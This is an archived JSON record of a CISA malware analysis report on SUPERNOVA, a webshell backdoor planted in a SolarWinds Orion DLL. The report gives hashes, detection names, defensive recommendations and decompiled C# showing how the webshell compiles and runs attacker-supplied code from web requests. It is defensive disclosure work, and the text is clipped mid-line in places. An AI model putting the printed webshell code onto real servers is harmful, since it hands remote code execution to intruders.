{
    "id": "8f815ce1-112c-490e-a9b0-877c0515c041",
    "created_at": "2023-01-12T15:01:55.45658Z",
    "updated_at": "2025-03-27T02:06:02.616372Z",
    "deleted_at": null,
    "sha1_hash": "80cc62362c0288082c46d66300f4721a2cbd172f",
    "title": "2021-01-27 - Malware Analysis Report (AR21-027A)- MAR-10319053-1.v1 - Supernova",
    "authors": "",
    "file_creation_date": "2022-05-29T01:06:05Z",
    "file_modification_date": "2022-05-29T01:06:05Z",
    "file_size": 147745,
    "plain_text": "# MAR-10319053-1.v2 - Supernova\n\n**us-cert.cisa.gov/ncas/analysis-reports/ar21-027a**\n\n## Notification\n\nThis report is provided \"as is\" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of an\n\nThis document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeab\nwithout restriction. For more information on the Traffic Light Protocol (TLP), see http://www.cisa.gov/tlp.\n\n## Summary\n\n**Description**\n\nThis report provides detailed analysis of several malicious artifacts, affecting the SolarWinds Orion product, which have been identified by the sec\nit is placed by an attacker directly on a system that hosts SolarWinds Orion and is designed to appear as part of the SolarWinds product. CISA's a\nmalware discovered‚Äù for more information.\n\nThis report describes the analysis of a PowerShell script that decodes and installs SUPERNOVA, a malicious webshell backdoor. SUPERNOVA is\nmalware allows a remote operator to dynamically inject C# source code into a web portal provided via the SolarWinds software suite. The injected\n[For a downloadable copy of indicators of compromise (IOCs), see: MAR-10319053-1.v2.stix](https://us-cert.cisa.gov/sites/default/files/publications/MAR-10319053.r1.v2.WHITE_stix.xml)\n\n**References**\n\n[https://us-cert.cisa.gov/ncas/alerts/aa20-352a](https://us-cert.cisa.gov/ncas/alerts/aa20-352a)\n\n[https://www.solarwinds.com/securityadvisory#anchor2](https://www.solarwinds.com/sa-overview/securityadvisory#anchor2)\n\n[https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defende](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)\n\nSubmitted Files (2)\n\n290951fcc76b497f13dcb756883be3377cd3a4692e51350c92cac157fc87e515 (1.ps1)\n\nc15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71 (App_Web_logoimagehandler.ashx....)\n\n## Findings\n\n**290951fcc76b497f13dcb756883be3377cd3a4692e51350c92cac157fc87e515**\n\nTags\n\ntrojan\n\nDetails\n\n**Name** 1.ps1\n\n**Size** 10609 bytes\n\n**Type** ASCII text, with very long lines\n\n**MD5** 4423a4353a0e7972090413deb40d56ad\n\n**SHA1** 8004d78e6934efb4dea8baf48a589c2c1ed10bf3\n\n**SHA256** 290951fcc76b497f13dcb756883be3377cd3a4692e51350c92cac157fc87e515\n\n**SHA512** 5d2dee3c8e4c6a4fa1d84e434ab0b864245fae51360e03ed7338c2b40d7c1d61aad755f8c54615197100dd3b8bfd00d33b25617812300\n\n**ssdeep** 192:9x2OrPgH8XWECNsW4IX4SLY0tqIeZ9StIGca/HjKxnlyImIwN:Fr28XWECNsbIX4SLY0BeZ9StI9OHjMlw\n\n**Entropy** 4.457683\n\nAntivirus\n\n**Microsoft Security Essentials** Trojan:MSIL/Solorigate.G!dha\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nRelationships\n\n290951fcc7... Contains c15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71\n\nDescription\n\n\n-----\n\ng p g y y\n(c15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71). The DLL is patched with the SUPERNOVA webshell and is a rep\n\nDisplayed below is a portion of the event log with the victim information redacted. It indicates the malicious PowerShell was executed by the legiti\n\n--Begin event log-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n[Convert]::FromBase64String($b);[IO.File]::WriteAllBytes($f $bs)' 'S-1-0-0' '-' '-' '0x0000000000000000' 'E:\\Program Files (x86)\\SolarWinds\\Orion\\S\n--End event log-**c15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71**\n\nTags\n\nbackdoortrojan\n\nDetails\n\n**Name** App_Web_logoimagehandler.ashx.b6031896.dll\n\n**Size** 7680 bytes\n\n**Type** PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\n**MD5** 56ceb6d0011d87b6e4d7023d7ef85676\n\n**SHA1** 75af292f34789a1c782ea36c7127bf6106f595e8\n\n**SHA256** c15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71\n\n**SHA512** f7eac6ab99fe45ca46417cdca36ba27560d5f8a2f37f378ba97636662595d55fa34f749716971aa96a862e37e0199eb6cb905636e6ab01\n\n**ssdeep** 192:8/SqRzbt0GBDawA5uT8wSlyDDGTBNFkQ:8/SyHKGBDax5uThDD6BNr\n\n**Entropy** 4.622450\n\nAntivirus\n\n**Ahnlab** Backdoor/Win32.SunBurst\n\n**Antiy** Trojan/MSIL.Agent\n\n**Avira** TR/Sunburst.BR\n\n**BitDefender** Trojan.Supernova.A\n\n**Clamav** Win.Countermeasure.SUPERNOVA-9808999-1\n\n**Comodo** Backdoor\n\n**Cyren** W32/Supernova.GYFL-6114\n\n**ESET** a variant of MSIL/SunBurst.A trojan\n\n**Emsisoft** Trojan.Supernova.A (B)\n\n**Ikarus** Backdoor.Sunburst\n\n**K7** Trojan ( 00574a531 )\n\n**Lavasoft** Trojan.Supernova.A\n\n**McAfee** Trojan-sunburst\n\n**Microsoft Security Essentials** Trojan:MSIL/Solorigate.G!dha\n\n**NANOAV** Trojan.Win32.Sunburst.iduxaq\n\n**Quick Heal** Backdoor.Sunburst\n\n**Sophos** Mal/Sunburst-B\n\n**Symantec** Backdoor.SuperNova\n\n**Systweak** trojan-backdoor.sunburst-r\n\n**TrendMicro** Trojan.59AF4B5F\n\n**TrendMicro House Call** Trojan.59AF4B5F\n\n**VirusBlokAda** TScope.Trojan.MSIL\n\n\n-----\n\n**Zillya!** Trojan.SunBurst.Win32.3\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\n**100** 5976f9a3f7dcd2c124f1664003a1bb607bc22abc2c95abe5ecd645a5dbfe2c6c\n\nPE Metadata\n\n**Compile Date** 2020-03-24 05:16:10-04:00\n\n**Import Hash** dae02f32a21e03ce65412f6e56942daa\n\n**Company Name** None\n\n**File Description**\n\n**Internal Name** App_Web_logoimagehandler.ashx.b6031896.dll\n\n**Legal Copyright**\n\n**Original Filename** App_Web_logoimagehandler.ashx.b6031896.dll\n\n**Product Name** None\n\n**Product Version** 0.0.0.0\n\nPE Sections\n\n**MD5** **Name** **Raw Size** **Entropy**\n\n21556dbcb227ba907e33b0847b427ef4 header 512 2.597488\n\n9002a963c87901397a986c3333d09627 .text 5632 5.285309\n\n78888431b10a2bf283387437a750bca3 .rsrc 1024 2.583328\n\n45ded0a8dacde15cb402adfe11b0fe3e .reloc 512 0.081539\n\nPackers/Compilers/Cryptors\n\nMicrosoft Visual C# / Basic .NET\n\nRelationships\n\nc15abaf51e... Contained_Within 290951fcc76b497f13dcb756883be3377cd3a4692e51350c92cac157fc87e515\n\nDescription\n\nThis file is a 32-bit .NET DLL that has been identified as a modified SolarWinds plug-in. The malware patched into this plug-in has been identified\nexpected to partially contain C# code, which the function will compile and execute directly in system memory. The purpose of this malware indicat\nfunction.\n\nThe ProcessRequest function takes an HttpContext Data structure as an argument. It parses portions of the request substructure of the parent Ht\nThese four variables are then provided as arguments to the DynamicRun function described next.\n\nThe \"DynamicRun\" function is designed to accept C# code and then dynamically compile and execute it. The \"codes\" variable provided to the fun\nfunction name that will be called for the newly compiled class. The \"args\" variable will contain the arguments provided to the executed malicious c\n\nAfter parsing out and executing the provided code, the \"ProcessRequest\" function will continue on to call a function named \"WebSettingsDAL.get_\n\n--Begin ProcessRequest Function-public void ProcessRequest(HttpContext context)\n{\ntry\n{\nstring codes = context.Request[\"codes\"];\nstring clazz = context.Request[\"clazz\"];\nstring method = context.Request[\"method\"];\nstring[] args = context.Request[\"args\"].Split('\\n');\ncontext.Response.ContentType = \"text/plain\";\ncontext.Response.Write(this.DynamicRun(codes, clazz, method, args));\n}\n\nt h (E ti )\n\n\n-----\n\n{\n}\nNameValueCollection queryString = HttpUtility.ParseQueryString(context.Request.Url.Query);\ntry\n{\nstring str1 = queryString[\"id\"];\nstring s;\nif (!(str1 == \"SitelogoImage\"))\n{\nif (!(str1 == \"SiteNoclogoImage\"))\nthrow new ArgumentOutOfRangeException(queryString[\"id\"]);\ns = WebSettingsDAL.get_NewNOCSiteLogo();\n}\nelse\ns = WebSettingsDAL.get_NewSiteLogo();\nbyte[] buffer = Convert.FromBase64String(s);\nif ((buffer == null || buffer.Length == 0) && File.Exists(HttpContext.Current.Server.MapPath(\"//NetPerfMon//images//NoLogo.gif\")))\nbuffer = File.ReadAllBytes(HttpContext.Current.Server.MapPath(\"//NetPerfMon//images//NoLogo.gif\"));\nstring str2 = buffer.Length < 2 || buffer[0] != byte.MaxValue || buffer[1] != (byte) 216 ? (buffer.Length < 3 || buffer[0] != (byte) 71 || (buffer[1] != (by\n|| (buffer[5] != (byte) 10 || buffer[6] != (byte) 26)) || buffer[7] != (byte) 10 ? \"image/jpeg\" : \"image/png\") : \"image/gif\") : \"image/jpeg\";\ncontext.Response.OutputStream.Write(buffer, 0, buffer.Length);\ncontext.Response.ContentType = str2;\ncontext.Response.Cache.SetCacheability(HttpCacheability.Private);\ncontext.Response.StatusDescription = \"OK\";\ncontext.Response.StatusCode = 200;\nreturn;\n}\ncatch (Exception ex)\n{\nLogoImageHandler._log.Error((object) \"Unexpected error trying to provide logo image for the page.\", ex);\n}\ncontext.Response.Cache.SetCacheability(HttpCacheability.NoCache);\ncontext.Response.StatusDescription = \"NO IMAGE\";\ncontext.Response.StatusCode = 500;\n}\n--End ProcessRequest Function-\n--Begin DynamicRun Function-public string DynamicRun(string codes, string clazz, string method, string[] args)\n{\nICodeCompiler compiler = new CSharpCodeProvider().CreateCompiler();\nCompilerParameters options = new CompilerParameters();\noptions.ReferencedAssemblies.Add(\"System.dll\");\noptions.ReferencedAssemblies.Add(\"System.ServiceModel.dll\");\noptions.ReferencedAssemblies.Add(\"System.Data.dll\");\noptions.ReferencedAssemblies.Add(\"System.Runtime.dll\");\noptions.GenerateExecutable = false;\noptions.GenerateInMemory = true;\nstring source = codes;\nCompilerResults compilerResults = compiler.CompileAssemblyFromSource(options, source);\nif (compilerResults.Errors.HasErrors)\n{\n// ISSUE: reference to a compiler-generated field\n// ISSUE: reference to a compiler-generated field\n// ISSUE: reference to a compiler-generated field\n// ISSUE: method pointer\nstring.Join(Environment.NewLine, (IEnumerable<string>) Enumerable.Select<CompilerError, string>((IEnumerable<M0>) compilerResults.Erro\nnew Func<CompilerError, string>((object) LogoImageHandler.\\u003C\\u003Ec.\\u003C\\u003E9, __methodptr(\\u003CDynamicRun\\u003Eb__3_0))\nConsole.WriteLine(\"error\");\nreturn compilerResults.Errors.ToString();\n}\nobject instance = compilerResults.CompiledAssembly.CreateInstance(clazz);\nreturn (string) instance.GetType().GetMethod(method).Invoke(instance, (object[]) args);\n}\n--End DynamicRun Function-Screenshots\n\n**Figure 1 -**\n\n## Relationship Summary\n\n\n-----\n\n290951fcc7... Contains c15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71\n\nc15abaf51e... Contained_Within 290951fcc76b497f13dcb756883be3377cd3a4692e51350c92cac157fc87e515\n\n## Recommendations\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organizatio\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\nDisable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unl\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Specia\n\n## Contact Information\n\nCISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this product at t\n\n## Document FAQ\n\n**What is a MIFR? A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely manner. In most**\nregarding the level of desired analysis.\n\n**What is a MAR? A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired via manua**\n\n**Can I edit this document? This document is not to be edited in any way by recipients. All comments or questions related to this document should**\n\n**Can I submit malware to CISA? Malware samples can be submitted via three methods:**\n\nWeb: [https://malware.us-cert.gov](https://malware.us-cert.gov/)\nE-Mail: [submit@malware.us-cert.gov](http://10.10.0.46/mailto:submit@malware.us-cert.gov)\nFTP: ftp.malware.us-cert.gov (anonymous)\n\nCISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and ph\n\n## Revisions\n\nJanuary 27, 2021: Initial Version\n\nNovember 17, 2021: Removed a file that was determined to be a legitimate SolarWinds file\n\n[This product is provided subject to this Notification and this](https://us-cert.cisa.gov/privacy/notification) [Privacy & Use policy.](https://www.dhs.gov/privacy-policy)\n\n**Please share your thoughts.**\n\n[We recently updated our anonymous product survey; we'd welcome your feedback.](https://www.surveymonkey.com/r/CISA-cyber-survey?product=https://us-cert.cisa.gov/ncas/analysis-reports/ar21-027a)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-27 - Malware Analysis Report (AR21-027A)- MAR-10319053-1.v1 - Supernova.pdf"
    ],
    "report_names": [
        "2021-01-27 - Malware Analysis Report (AR21-027A)- MAR-10319053-1.v1 - Supernova.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535715,
    "ts_updated_at": 1743041162,
    "ts_creation_date": 1653786365,
    "ts_modification_date": 1653786365,
    "files": {
        "pdf": "https://archive.orkl.eu/80cc62362c0288082c46d66300f4721a2cbd172f.pdf",
        "text": "https://archive.orkl.eu/80cc62362c0288082c46d66300f4721a2cbd172f.txt",
        "img": "https://archive.orkl.eu/80cc62362c0288082c46d66300f4721a2cbd172f.jpg"
    }
}